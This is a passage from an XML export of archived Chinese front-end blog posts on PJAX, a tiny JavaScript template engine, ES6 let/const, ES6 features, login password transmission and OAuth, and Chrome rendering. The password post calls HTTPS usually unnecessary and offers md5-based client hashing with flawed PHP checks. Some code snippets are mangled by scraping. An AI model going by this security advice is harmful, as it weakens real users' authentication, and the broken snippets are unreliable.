url])：更改当前页面的历史记录。参数同上。这种更改并不会去访问该URL。当点击\上一张”、\下一张”这两个链接的时候，首先通过pushState修改URL以及修改document.title，那这个时候你就可以当做文档已经进入了另外一个链接了，然后该干什么干什么。demo中是让图片fadeOut，fadeOut完了之后让浏览器去加载资源，这个步骤就是正常的AJAX操作啦，没有什么特殊之处了~因为只准备了三张图片，所有后台写的也比较简单： 12345678910111213141516171819202122232425262728293031&lt;?phperror_reporting(false);$num = $_GET[&apos;num&apos;];if(array_key_exists(&apos;HTTP_X_PJAX&apos;, $_SERVER) &amp;&amp; $_SERVER[&apos;HTTP_X_PJAX&apos;] === &apos;true&apos;)&#123; if($num == 1) &#123;?&gt; &lt;div class=&quot;imgwrap&quot;&gt; &lt;img src=&quot;./images/1.jpg&quot;&gt; &lt;/div&gt; &lt;span&gt;&lt;a href=&quot;num=2&quot; class=&quot;next&quot;&gt;下一张&lt;gt;&lt;gt;&lt;/a&gt;&lt;/span&gt;&lt;?php &#125; else if ($num == 2) &#123;?&gt; &lt;div class=&quot;imgwrap&quot;&gt; &lt;img src=&quot;./images/2.jpg&quot;&gt; &lt;/div&gt; &lt;span&gt;&lt;a href=&quot;num=1&quot; class=&quot;previous&quot;&gt;&lt;lt;&lt;lt;上一张&lt;/a&gt; &lt;a href=&quot;num=3&quot; class=&quot;next&quot;&gt;下一张&lt;gt;&lt;gt;&lt;/a&gt;&lt;/span&gt;&lt;?php &#125; else &#123;?&gt; &lt;div class=&quot;imgwrap&quot;&gt; &lt;img src=&quot;./images/3.jpg&quot;&gt; &lt;/div&gt; &lt;span&gt;&lt;a href=&quot;num=2&quot; class=&quot;previous&quot;&gt;&lt;lt;&lt;lt;上一张&lt;/a&gt;&lt;/span&gt;&lt;?php &#125;&#125;?&gt; &nbsp;上面那张图中，我们看到了，并不是每个连接都使用PJAX来加载，如果有X_PJAX标识，我们才会添加相应的处理。js中稍加注意可以看到： 12345678910$.ajax(&#123; &quot;url&quot;: &quot;./interface.php&quot;, &quot;data&quot;: &#123; &quot;num&quot;: num &#125;, &quot;dataType&quot;: &quot;html&quot;, &quot;headers&quot;: &#123; &quot;X_PJAX&quot;: true &#125;&#125;); &nbsp;请求中： 1234567Accept:text/html, */*; q=0.01Accept-Encoding:gzip,deflate,sdchConnection:keep-aliveHost:qianduannotes.duapp.comUser-Agent:Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36X-Requested-With:XMLHttpRequestX_PJAX:true &nbsp;我在请求的header中加了一个X_PJAX的头，而后台在处理的时候也做了判断： 1234function is_pjax()&#123; return array_key_exists(&apos;HTTP_X_PJAX&apos;, $_SERVER) &amp;&amp; $_SERVER[&apos;HTTP_X_PJAX&apos;] === &apos;true&apos;;&#125; &nbsp;并不是一定要求在header头部中加入X_PJAX的信息，你也可以在url中加入相关的参数，比如:http://example.com?pjax=1，或者其他方式，只要前后端达到一个共识就行。 三、开源的PJAX库 已经有人对这个东西做了封装，我就不重复造轮子了。 welefen封装的库，对jquery、qwrap和kissy都做了封装，github地址Yahoo团队 PJAX地址并不是页面中所有的链接都需要使用PJAX加载，所有在需要这个东西的a标签上加一个属性，如data-pjax=true，然后统一添加事件。四、注意事项如果浏览器不支持pushState接口函数，那就只能退化为ajax或者使用hash bang了~本地环境下使用的话，浏览器会报错：`Uncaught SecurityError: A history state object with URL file:///E:/baidu_app/demo/PJAX/pic-2’ cannot be created in a document with origin ‘null’. ，所以如果你要测试的话，请把代码丢到服务器上！为了得到更好的体验，PJAX经常配合localStorage来使用，把请求到的内容缓存到本地，再一次请求的时候先从本地查看。如果你的内容是动态变化的，缓存的时候加一个缓存时间，方便更新缓存。还有一个容易忽略的东西是统计，使用PJAX只会局部刷新页面，如果忽略了对统计函数的更新，那就会让你失去很多数据。五、参考资料http://www.welefen.com/pjax-for-ajax-and-pushstate.html welefenhttp://ntotten.com/2012/04/09/building-super-fast-web-apps-with-pjax/ Nathan Tottenhttp://yuilibrary.com/yui/docs/pjax/ YUI Pjax]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>PJAX</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript模板引擎原理，几行代码的事儿]]></title>
    <url>%2Fblog%2F2013%2F12%2F03%2F2013-12-03-cb-principle-of-javascript-template%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 一、前言 什么是模板引擎，说的简单点，就是一个字符串中有几个变量待定。比如： 1var tpl = &apos;Hei, my name is &lt;%name%&gt;, and I\&apos;m &lt;%age%&gt; years old.&apos;; 通过模板引擎函数把数据塞进去， 1234567var data = &#123; &quot;name&quot;: &quot;Barret Lee&quot;, &quot;age&quot;: &quot;20&quot;&#125;;var result = tplEngine(tpl, data);//Hei, my name is Barret Lee, and I&apos;m 20 years old. 那这玩意儿有什么作用呢？其实他就是一个预处理器（preprocessor），搞php开发的童鞋对Smarty必然是十分熟悉，Smarty是一个php模板引擎，tpl中待处理的字符通过数据匹配然后输出相应的html代码，加之比较给力的缓存技术，其速度和易用性是非常给力的！JS Template也是一样的，我们的数据库里保存着数以千万计的数据，而每一条数据都是通过同一种方式输入，就拿上面的例子来说，我们不可能在数据库里存几千条”Hei, my name…”，而是只保存对应的name和age，通过模板输出结果。JS模板引擎应该做哪些事情？看看下面一串代码： 12345678var tpl = &apos;&lt;% for(var i = 0; i &lt; this.posts.length; i++) &#123;&apos; + &apos;var post = posts[i]; %&gt;&apos; + &apos;&lt;% if(!post.expert)&#123; %&gt;&apos; + &apos;&lt;span&gt;post is null&lt;/span&gt;&apos; + &apos;&lt;% &#125; else &#123; %&gt;&apos; + &apos;&lt;a href=&quot;#&quot;&gt;&lt;% post.expert %&gt; at &lt;% post.time %&gt;&lt;/a&gt;&apos; + &apos;&lt;% &#125; %&gt;&apos; +&apos;&lt;% &#125; %&gt;&apos;; 一个基本的模板引擎至少可以保证上面的代码可以正常解析。如送入的数据是： 123456789101112131415var data = &#123; &quot;posts&quot;: [&#123; &quot;expert&quot;: &quot;content 1&quot;, &quot;time&quot;: &quot;yesterday&quot; &#125;,&#123; &quot;expert&quot;: &quot;content 2&quot;, &quot;time&quot;: &quot;today&quot; &#125;,&#123; &quot;expert&quot;: &quot;content 3&quot;, &quot;time&quot;: &quot;tomorrow&quot; &#125;,&#123; &quot;expert&quot;: &quot;&quot;, &quot;time&quot;: &quot;eee&quot; &#125;]&#125;; &nbsp;可以输出： 1234&lt;a href=&quot;#&quot;&gt;content 1 at yesterday&lt;/a&gt;&lt;a href=&quot;#&quot;&gt;content 2 at today&lt;/a&gt;&lt;a href=&quot;#&quot;&gt;content 3 at tomorrow&lt;/a&gt;&lt;span&gt;post is null&lt;/span&gt; 先戳这个demo看看。&nbsp;下面就具体说说这个模板引擎的原理是啥样的。 二、JS模板引擎的实现原理 1.正则抠出要匹配的内容针对这一串代码，通过正则获取内容12345var tpl = &apos;Hei, my name is &lt;%name%&gt;, and I\&apos;m &lt;%age%&gt; years old.&apos;;var data = &#123; &quot;name&quot;: &quot;Barret Lee&quot;, &quot;age&quot;: &quot;20&quot;&#125;;&nbsp;最简单的方式就是通过replace函数了：123var result = tpl.replace(/&lt;%([^%&gt;]+)?%&gt;/g, function(s0, s1)&#123; return data[s1];&#125;);&nbsp;通过正则替换，我们很轻松的拿到了result，你可以去试一试，他正式我们想要的结果。但是这里又有了一个问题，改一下data和tpl，12345var tpl = &apos;Hei, my name is &lt;%name%&gt;, and I\&apos;m &lt;%info.age%&gt; years old.&apos;;var data = &#123; &quot;name&quot;: &quot;Barret Lee&quot;, &quot;info&quot;: &#123; age&quot;: &quot;20&quot;&#125;&#125;;&nbsp;再用上面的方式去获取结果，呵呵，不行了吧~ 这里data[“info.age”]本身就是undefined，所以我们需要换一种方式来处理这个问题，那就是将它转换成真正的JS代码。如：1return &apos;Hei, my name is &apos; + data.name + &apos;, and I\&apos;m &apos; + data.info.age&apos; + &apos; years old.&apos;&nbsp;但是接着又有一个问题来了，当我们的代码中出现for循环和if的时候，上面的转换明显是不起作用的，如：123var tpl = &apos;Posts: &apos; + &apos;&lt;% for(var=&quot;&quot; i=&quot;0;&quot; &lt;=&quot;&quot; post.length;=&quot;&quot; i++)=&quot;&quot; &#123;&apos;+=&quot;&quot; &apos;&lt;a=&quot;&quot; href=&quot;#&quot;&gt;&lt;% post[i].expert=&quot;&quot; %=&quot;&quot;&gt;&apos; + &apos;&lt;% &#125;=&quot;&quot; %=&quot;&quot;&gt;&apos;&nbsp;如果继续采用上面的方式，得到的结果便是：1234return &apos;Posts: &apos; + for(var i = 0; i &lt; post.length; i++) &#123; + &apos;&lt;a href=&quot;#&quot;&gt;&apos; + post[i].exper + &apos;&lt;/a&gt;&apos; + &#125;&nbsp;这显然不是我们愿意看到的，稍微观察一下上面的结构，如果可以返回一个这样的结果也挺不错哦：1234&apos;Posts: &apos;for(var i = 0; i &lt; post.length; i++) &#123; &apos;&lt;a href=&quot;#&quot;&gt;&apos; + post[i].exper + &apos;&lt;/a&gt;&apos;&#125;&nbsp;但是我们需要得到的是一个字符串，而不是上面这样零散的片段，因此可以把这些东西装入数组中。2.装入数组 1234567var r = [];r.push(&apos;Posts: &apos; );r.push(for(var i = 0; i &lt; post.length; i++) &#123;);r.push(&apos;&lt;a href=&quot;#&quot;&gt;&apos;);r.push(post[i].exper);r.push(&apos;&lt;/a&gt;&apos;);r.push(&#125;); &nbsp;有人看到上面的代码就要笑了，第三行和最后一行代码的逻辑明显是不正确的嘛，那肿么办呢？呵呵，很简单，不放进去就行了呗， 1234567var r = [];r.push(&apos;Posts: &apos; );for(var i = 0; i &lt; post.length; i++) &#123; r.push(&apos;&lt;a href=&quot;#&quot;&gt;&apos;); r.push(post[i].exper); r.push(&apos;&lt;/a&gt;&apos;);&#125; &nbsp;这样的逻辑就十分完善了，不存在太多的漏洞，但是这个转化的过程是如何实现的？我们必须还是要写一个解析的模板函数出来。3.分辨js逻辑部分1234var r = [];tpl.replace(/&lt;%([^%&gt;]+)?%&gt;/g, function(s0, s1)&#123; //完蛋了，这里貌似又要回到上面那可笑的逻辑有错误的一步啦... 该怎么处理比较好？&#125;);&nbsp;完蛋了，这里貌似又要回到上面那可笑的逻辑有错误的一步啦… 该怎么处理比较好？我们知道，JS给我们提供了构造函数的\类”， 123var fn = new Function(&quot;data&quot;, &quot;var r = []; for(var i in data)&#123; r.push(data[i]); &#125; return r.join(&apos; &apos;)&quot;);fn(&#123;&quot;name&quot;: &quot;barretlee&quot;, &quot;age&quot;: &quot;20&quot;&#125;); // barretlee 20 &nbsp;知道了这个就好办了，我们可以把逻辑部分和非逻辑部分的代码链接成一个字符串，然后利用类似fn的函数直接编译代码。而/&lt;%([^%&gt;]+)?%&gt;/g，这一个正则只能把逻辑部分匹配出来，要想把所有的代码都组合到一起，必须还得匹配非逻辑部分代码。replace函数虽然很强大，他也可以完成这个任务，但是实现的逻辑比较晦涩，所以我们换另外一种方式来处理。先看一个简单的例子： 1234var reg = /&lt;%([^%&gt;]+)?%&gt;/g;var tpl = &apos;Hei, my name is &lt;%name%&gt;, and I\&apos;m &lt;%age%&gt; years old.&apos;;var match = reg.exec(tpl);console.log(match); &nbsp;看到的是： 1234567[ 0: &quot;&lt;%name%&gt;&quot;, 1: name, index: 16, input: &quot;Hei, my name is &lt;%name%&gt;, and I&apos;m &lt;%age%&gt; years old.&quot; length: 2] &nbsp;这。。。我们可是想得到所有的匹配啊，他竟然只获取了name而忽略了后面的age，好吧，对正则稍微熟悉点的童鞋一定会知道应该这样处理： 1234var reg = /&lt;%([^%&gt;]+)?%&gt;/g;while(match = reg.exec(tpl)) &#123; console.log(match);&#125; &nbsp;关于正则表达式的内容就不在这里细说了，有兴趣的同学可以多去了解下match,exec,search等正则的相关函数。这里主要是靠match的index属性来定位遍历位置，然后利用while循环获取所有的内容。4.引擎函数所以我们的引擎函数雏形差不多就出来了： 123456789101112131415161718192021var tplEngine = function(tpl, data)&#123; var reg = /&lt;%([^%&gt;]+)?%&gt;/g, code = &apos;var r=[];\n&apos;, cursor = 0; //主要的作用是定位代码最后一截 var add = function(line) &#123; code += &apos;r.push(&quot;&apos; + line.replace(/&quot;/g, &apos;\\&quot;&apos;) + &apos;&quot;);\n&apos;; &#125;; while(match = reg.exec(tpl)) &#123; add(tpl.slice(cursor, match.index)); //添加非逻辑部分 add(match[1]); //添加逻辑部分 match[0] = &quot;&lt;%&quot; +=&quot;&quot; match[1]=&quot;&quot; &quot;%=&quot;&quot;&gt;&quot;; cursor = match.index + match[0].length; &#125; add(tpl.substr(cursor, tpl.length - cursor)); //代码的最后一截 如:&quot; years old.&quot; code += &apos;return r.join(&quot;&quot;);&apos;; // 返回结果，在这里我们就拿到了装入数组后的代码 console.log(code); return tpl;&#125;; &nbsp;这样一来，测试一个小demo: 12345678 var tpl = &apos;&lt;% for(var=&quot;&quot; i=&quot;0;&quot; &lt;=&quot;&quot; this.posts.length;=&quot;&quot; i++)=&quot;&quot; &#123;&apos;=&quot;&quot; + =&quot;&quot; &apos;var=&quot;&quot; post=&quot;posts[i];&quot; %=&quot;&quot;&gt;&apos; + &apos;&lt;% if(!post.expert)&#123;=&quot;&quot; %=&quot;&quot;&gt;&apos; + &apos;&lt;span&gt;post is null&lt;/span&gt;&apos; + &apos;&lt;% &#125;=&quot;&quot; else=&quot;&quot; &#123;=&quot;&quot; %=&quot;&quot;&gt;&apos; + &apos;&lt;a href=&quot;#&quot;&gt;&lt;% post.expert=&quot;&quot; %=&quot;&quot;&gt; at &lt;% post.time=&quot;&quot; %=&quot;&quot;&gt;&lt;/%&gt;&lt;/%&gt;&lt;/a&gt;&apos; + &apos;&lt;% &#125;=&quot;&quot; %=&quot;&quot;&gt;&apos; + &apos;&lt;% &#125;=&quot;&quot; %=&quot;&quot;&gt;&apos;;tplEngine(tpl, data); &nbsp;返回的结果让人很满意： 1234567891011121314151617var r=[];r.push(&quot;&quot;);r.push(&quot; for(var i = 0; i &lt; this.posts.length; i++) &#123;var post = posts[i]; &quot;);r.push(&quot;&quot;);r.push(&quot; if(!post.expert)&#123; &quot;);r.push(&quot;&lt;span&gt;post is null&lt;/span&gt;&quot;);r.push(&quot; &#125; else &#123; &quot;);r.push(&quot;&lt;a href=&quot;\&quot;#\&quot;&quot;&gt;&quot;);r.push(&quot; post.expert &quot;);r.push(&quot; at &quot;);r.push(&quot; post.time &quot;);r.push(&quot;&lt;/a&gt;&quot;);r.push(&quot; &#125; &quot;);r.push(&quot;&quot;);r.push(&quot; &#125; &quot;);r.push(&quot;&quot;);return r.join(&quot;&quot;); &nbsp;不过我们并需要for，if，switch等这些东西也push到r数组中去，所以呢，还得改善下上面的代码，如果在line中发现了包含js逻辑的代码，我们就不应该让他进门： 12345regOut = /(^( )?(if|for|else|switch|case|break|&#123;|&#125;))(.*)?/g;var add = function(line, js) &#123; js? code += line.match(regOut) ? line + &apos;\n&apos; : &apos;r.push(&apos; + line + &apos;);\n&apos; : code += &apos;r.push(&quot;&apos; + line.replace(/&quot;/g, &apos;\\&quot;&apos;) + &apos;&quot;);\n&apos;;&#125;; &nbsp;所以我们只剩下最后一步工作了，把data扔进去！5.把data扔进去没有比完成这东西更简单的事情啦，通过上面对Function这个函数的讲解，大家应该也知道怎么做了。 1return new Function(code).apply(data); &nbsp;使用apply的作用就是让code中的一些变量作用域绑定到data上，不然作用域就会跑到global上，这样得到的数据索引就会出问题啦~ 当然我们可以再优化一下： 1return new Function(code.replace(/[\r\t\n]/g, &apos;&apos;)).apply(data); &nbsp;把回车换行以及tab键都给匹配掉，让代码更加干净一点。那么最终的代码就是： 12345678910111213141516171819var tplEngine = function(tpl, data) &#123; var reg = /&lt;%([^%&gt;]+)?%&gt;/g, regOut = /(^( )?(if|for|else|switch|case|break|&#123;|&#125;))(.*)?/g, code = &apos;var r=[];\n&apos;, cursor = 0; var add = function(line, js) &#123; js? (code += line.match(regOut) ? line + &apos;\n&apos; : &apos;r.push(&apos; + line + &apos;);\n&apos;) : (code += line != &apos;&apos; ? &apos;r.push(&quot;&apos; + line.replace(/&quot;/g, &apos;\\&quot;&apos;) + &apos;&quot;);\n&apos; : &apos;&apos;); return add; &#125; while(match = reg.exec(tpl)) &#123; add(tpl.slice(cursor, match.index))(match[1], true); cursor = match.index + match[0].length; &#125; add(tpl.substr(cursor, tpl.length - cursor)); code += &apos;return r.join(&quot;&quot;);&apos;; return new Function(code.replace(/[\r\t\n]/g, &apos;&apos;)).apply(data);&#125;; 三、应用场景 毕竟是前端代码，所以写出来是要为前端服务的，平时我们处理的一般是一个html的模板，通常的情况下，模板代码是放在script标签或者textarea中，所以首先是要获取到这里头的东西，然后再来做解析。 1234567891011121314151617var barretTpl = function(str, data) &#123; //获取元素 var element = document.getElementById(str); if (element) &#123; //textarea或input则取value，其它情况取innerHTML var html = /^(textarea|input)$/i.test(element.nodeName) ? element.value : element.innerHTML; return tplEngine(html, data); &#125; else &#123; //是模板字符串，则生成一个函数 //如果直接传入字符串作为模板，则可能变化过多，因此不考虑缓存 return tplEngine(str, data); &#125; var tplEngine = function(tpl, data) &#123; // content above &#125;;&#125;; 这样一来就更加简单了，使用方式就是 barretTpl(str, data)， 这里的str可以是模板代码，也可以是一个DOM元素的id~ 可以看看这两段代码：//gist.github.com/barretlee/7765698, //gist.github.com/barretlee/7765587也可以直接戳这个demo。 四、优化以及功能拓展 总共就三四十行代码，完成的东西肯定是一个简洁版的，不过对于一个简单的页面而言，这几行代码已经足够使用了，如果还想对他做优化，可以从这几个方面考虑：优化获取的模板代码，比如去掉行尾空格等符号转义，如果我们想输出&lt;span&gt;hehe&lt;/span&gt;类似这样的源代码，在push之前必须进行转义代码缓存，如果一个模板会经常使用，可以将它用一个数组缓存在barretTpl闭包内用户自己设置分隔符五、参考资料[1]&nbsp;http://tech.pro/tutorial/1743/javascript-template-engine-in-just-20-lines&nbsp;&nbsp;Krasimir Tsonev&nbsp;[2]&nbsp;http://tangram.baidu.com/BaiduTemplate/&nbsp; JS template]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>模板引擎</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ECMAScript 6中的let和const关键词]]></title>
    <url>%2Fblog%2F2013%2F11%2F28%2F2013-11-28-cb-ES6-computed-properties%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. ECMAScript 6中多了两个定义变量的关键词，一个是let，另一个是const，后者顾名思义就是常量定义，前者的作用域范围是块级的。一般写过js的童鞋都知道，同其他语言一样，JS中的变量作用域是函数域而不是块级分割的，但是涉及到变量提升（hosting），闭包等问题的时候，很多有经验的程序员依然会头疼。 12345var a = 5;if(true)&#123; var a = 10;&#125;console.log(a);//10 上面的结果是10，但是我们看到，在if block内外都有一个a的定义，按我们正常的理解来看，这两个a应该占用的是不同的内存，而事实上，他们共用同一个内存。为此，ES 6中的let关键词\修复”了这个问题。 12345let a = 5;if(true)&#123; let a = 10;&#125;console.log(a); //5 let作用在块级作用域中，所以不管是switch还是if还是for，只要是let定义的变量，他就只能在那个花括号内部起作用。let是一个让程序员比较省心的一个关键词，而还有一个令人兴奋的关键词是let的兄弟const，一旦定义一个变量为const类型，后面就不能对他进行修改。 1234const aa = 11;alert(aa) //11aa = 22;alert(aa) //11 关于这两者的兼容性问题，可以到这里查看http://kangax.github.io/es5-compat-table/es6/Node已经支持了const和let关键词，可以这样使用node –harmony和use strict。目前一些浏览器还不支持这样的写法，但是利用defs.js这个库可以ES3也支持这个。他的原理就是利用esprima来编译并重写你的代码。比如： 12345678910&quot;use strict&quot;;function fn() &#123; const y = 0; for (let x = 0; x &lt; 10; x++) &#123; const y = x * 2; const z = y; &#125; console.log(y); // prints 0&#125;fn(); 经过def.js重新编译之后变成： 12345678910&quot;use strict&quot;;function fn() &#123; var y = 0; for (var x = 0; x &lt; 10; x++) &#123; var y$0 = x * 2; var z = y$0; &#125; console.log(y); // prints 0&#125;fn(); 详情可以去//github.com/olov/defs这里瞅瞅。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ECMAScript 6 简介]]></title>
    <url>%2Fblog%2F2013%2F11%2F26%2F2013-11-26-cb-ES6-introduce%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. ECMAScript 6 是JavaScript的下一个标准，正处在快速开发之中，大部分已经完成了，预计将在2014年正式发布。Mozilla将在这个标准的基础上，推出JavaScript 2.0。ECMAScript 6 的目标，是使得JavaScript可以用来编写复杂的应用程序、函数库和代码的自动生成器（code generator）。最新的浏览器已经部分支持ECMAScript 6 的语法，可以通过《ECMAScript 6 浏览器兼容表》查看浏览器支持情况。ECMAScript 6 新内容一览let, const (定义块级局部变量), 函数在块级域中解构: let {x, y} = pt; let [s, v, o] = triple(); (如可以 let pt = {x:2, y:-5}).参数设置默认设置: function f(x, y=1, z=0) {…}rest: function g(i, j, …r) { return r.slice(i, j); } (而不是疯狂地使用arguments).spread: let a = [0,1,2,3], o = new Something(…a);proxies: let obj = Proxy.create(handler, proto). 简单地说，就是类对象元素的符号重载.weak map: let map = new WeakMap. 当你有循环应用的时候用它.generators: function* gen() { yield 1; yield 2; } 事实上, gen() 返回一个有next()属性的对象迭代器: for (var [key, val] of items(x)) { alert(key + ‘,’ + val); }. Iterators 可以是 generators 或者 proxies.array and generator comprehension: [a+b for (a in A) for (b in B)] (array comprehension), (x for (x of generateValues()) if (x.color === ‘blue’)) (generator expression).二进制数据: const Pixel = new StructType({x:uint32, y:uint32, color:Color}) (此处Color本身就是一个结构类型), new ArrayType(Pixel, 3).类语法, 包含 extends, prototype, and super: 12345678910111213class Point extends Base &#123; constructor(x,y) &#123; super(); this[px] = x, this[py] = y; this.r = function() &#123; return Math.sqrt(x*x + y*y); &#125; &#125; get x() &#123; return this[px]; &#125; get y() &#123; return this[py]; &#125; proto_r() &#123; return Math.sqrt(this[px] * this[px] + this[py] * this[py]); &#125; equals(p) &#123; return this[px] === p[px] &amp;&amp; this[py] === p[py]; &#125;&#125; &nbsp;模块:12345678module math &#123; export function sum(x, y) &#123; return x + y; &#125; export var pi = 3.141593;&#125;import &#123;sum, pi&#125; from math;alert(sum(pi,pi));quasis: multiline, 可扩展的预处理字符串. You are ${age} years old.1234567// The following regexp spans multiple lines.re`line1: (words )*line2: \w+`// It desugars to:re(&#123;raw:&apos;line1: (words )*\nline2: \w+&apos;, cooked:&apos;line1: (words )*\nline2: \w+&apos;&#125;)&amp;nbsp;参考资料http://espadrine.github.io/New-In-A-Spec/es6/ espadrinehttp://javascript.ruanyifeng.com/oop/ecmascript6.html ruanyifeng 后续文章将陆续详细介绍上述新特性。]]></content>
      <categories>
        <category>前端杂烩</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OAuth认证原理及HTTP下的密码安全传输]]></title>
    <url>%2Fblog%2F2013%2F11%2F26%2F2013-11-26-cb-authentication-in-web%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 很多人都会问这样一个问题，我们在登录的时候，密码会不会泄露？随便进一个网站，登录时抓包分析，可以看到自己的密码都是明文传输的，在如此复杂的web环境下，我们没有百分的把握保证信息在传输过程中不被截获，那不使用明文如何告诉服务器自己的身份呢？在一些高度通信安全的网络中，数据传输会使用HTTPS作为传输协议，但是通常情况下我们没必要使用HTTPS传输，虽说安全，但传输数据都需要加密解密，很费时。我们可以使用一些加密方式（如md5）对密码进行加密，如果仅仅只对密码加密那肯定是没有任何作用，所以可以在密码中加入一些其他的字符，合并之后使这个密码成为一个临时密码~ 1234567891011121314151617&lt;label&gt;username:&lt;/label&gt;&lt;input id=&quot;uid&quot; type=&quot;text&quot;&gt;&lt;label&gt;password:&lt;/label&gt;&lt;input id=&quot;pwd&quot; type=&quot;password&quot;&gt;&lt;input type=&quot;submit&quot;&gt;&lt;script type=&quot;text/javascript&quot;&gt; var t = new Date*1, uid = $(&quot;#uid&quot;).val(), pwd = $(&quot;#pwd&quot;).val(), delta = encrypt($(&quot;#pwd&quot;).val() + t); $.post(&quot;./login.php&quot;,&#123; uid: $(&quot;#uid&quot;).val(), pwd: delta, tid: t &#125;, function(data)&#123; //do something. &#125;)&lt;/script&gt; 在上面，提交表单的时候，pwd并不是真实的密码，他是pwd与t混合再加密的字符串。这样的字符串即便是被人截获也是一个无效的数据，即便是截获并知道了破解方式，我们还可以在后台给他设定一个时效限制。 12345678910&lt;?php define(&quot;uid&quot;, &quot;user-A&quot;); define(&quot;pwd&quot;, &quot;user-A-pwd&quot;);if(time() - $_POST[&apos;tid&apos;] &gt; 60*2 || $_POST[&apos;uid&apos;] !== uid || decrypt(pwd . $_POST[&apos;tid&apos;]) !== $_POST[&apos;pwd&apos;])&#123; die(&quot;error&quot;);&#125;?&gt; 如果下面三个条件有一个不满足就报错时间超过2分钟uid不匹配pwd与t的组合密码不匹配当然，上面提到的encrypt和decrypt都是约定好的加密和解密方式，通常会使用md5加密。这样的加密传输方式，需要客户端和服务器端的时间比较准确。如果要考虑时间不准确问题以及hacker动作迅速的问题，那就得用token来验证了。所谓的token，其实就是在登录之前向服务器发送一个请求，获取准入的一个临时密码，这个临时密码是由服务器给出，所以不存在上面所说的时间不准确问题，同时这个token也是一个随机的字符串，只能单次使用，hacker很难获取，即便获取也无法使用，因为下一步登录所需的信息他没有。很多童鞋都用过人人、QQ、微博的开发平台，其中OAuth认证也就是这个原理。就拿人人开发平台的认证来说，他的认证流程是这样的：&nbsp;通过你在平台申请的API KEY向//graph.renren.com/oauth/authorize请求一个临时密码，也就是token code，然后利用token code向//graph.renren.com/oauth/token请求用户数据。整个流程十分简单。这是一个简单的demo，获取你的头像和姓名。人人OAuth认证demo使用token的弊端是需要额外发送一次请求，过程稍微复杂。有些公司VPN通道就是利用token做密码，为了保证高安全性，他们使用的是一个信息与服务器同步硬件设备，和银行发的动态口令一样，每次登陆都需要输入这个口令，那这个口令也就是token，不过他不是网络传输获取，所以安全性更高。]]></content>
      <categories>
        <category>前端杂烩</category>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[chrome浏览器渲染白屏问题剖析]]></title>
    <url>%2Fblog%2F2013%2F11%2F04%2F2013-11-04-cb-white-screen-in-chrome%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 刚截图十几次，终于捕捉到了这个白屏现象，hiahia~~大家可以很清晰地看到下边还木有渲染完毕的透明层，这是一个十分普遍的问题，经常遇到。我的浏览器版本是到目前为止应该是最新版(release版本)，之前的版本应该也存在类似的问题。只要处理好代码，这种体验相当不好的白屏问题是可以避免的，Qzone的页面貌似就没有这个现象。首先我们来聊一聊这个问题是怎么产生的，这涉及到chrome浏览器对网页的解析和渲染。渲染引擎首先通过网络获得所请求文档的内容，通常以8K分块的方式完成。下面是渲染引擎在取得内容之后的基本流程：解析html以构建dom树-&gt;构建render树-&gt;布局render树-&gt;绘制render树 渲染引擎开始解析html，并将标签转化为内容树中的dom节点。接着，它解析外部CSS文件及style标签中的样式信息。这些样式信息以及html中的可见性指令将被用来构建另一棵树&mdash;&mdash;render树。 Render树由一些包含有颜色和大小等属性的矩形组成，它们将被按照正确的顺序显示到屏幕上。 Render树构建好了之后，将会执行布局过程，它将确定每个节点在屏幕上的确切坐标。再下一步就是绘制，即遍历render树，并使用UI后端层绘制每个节点。 值得注意的是，这个过程是逐步完成的，为了更好的用户体验，渲染引擎将会尽可能早的将内容呈现到屏幕上，并不会等到所有的html都解析完成之后再去构建和布局render树。它是解析完一部分内容就显示一部分内容，同时，可能还在通过网络下载其余内容。 如果我们在Render树未完全绘制并渲染之前，向下快速拖动滚动条会看到上图所示的白屏现象。那这种现象可以通过什么方式来处理呢？应该说这是避免不了的，我们能做的就是：遵循XHTML编码规则，错误的标签在解析的过程中，浏览器需要花费很多时间去进行容错处理（一些push和pop操作），会在构建DOM树的时间花掉额外的时间。优化HTML代码，减少代码层次（有些网站堆砌一二十层标签的做法实在是没法不让人吐槽）优化css，减少样式计算所需要的时间，div div div div｛…｝，尽量不要出现这么复杂的选择符。尽量不要使用 document.write，html不能被自顶向下或自底向上地被解析，一种重要的原因也是因为脚本标签中含有这个所导致的，他可能会添加标签。缩短第一屏的内容，后几屏的内容用js异步+判断滚动条动作载入，减少构建Render树和布局render树的时间关于浏览器的工作原理，有兴趣的可以上网搜搜。]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SEO：让搜索引擎对你的网站更有亲和力(译)]]></title>
    <url>%2Fblog%2F2013%2F11%2F01%2F2013-11-01-cb-let-your-page-understood-by-search-engine%2F</url>
